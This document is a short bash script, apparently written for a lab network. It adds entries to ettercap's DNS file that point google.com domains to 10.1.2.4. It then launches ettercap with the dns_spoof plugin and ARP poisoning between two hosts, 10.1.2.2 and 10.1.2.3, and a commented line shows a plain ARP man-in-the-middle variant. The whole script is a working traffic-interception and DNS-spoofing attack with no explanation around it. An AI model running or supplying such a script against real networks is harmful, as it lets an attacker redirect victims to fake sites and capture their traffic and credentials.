#!/bin/bash
ETH=_
echo -e "*.google.com A 10.1.2.4\ngoogle.com A 10.1.2.4\nwww.google.com PTR 10.1.2.4" | sudo tee -a /etc/ettercap/etter.dns
# sudo ettercap --text --iface ${ETH} --nosslmitm --nopromisc --only-mitm --mitm arp /10.1.2.2/// /10.1.2.3///
sudo ettercap --plugin dns_spoof --text --iface ${ETH} --nopromisc --mitm arp /10.1.2.2/// /10.1.2.3///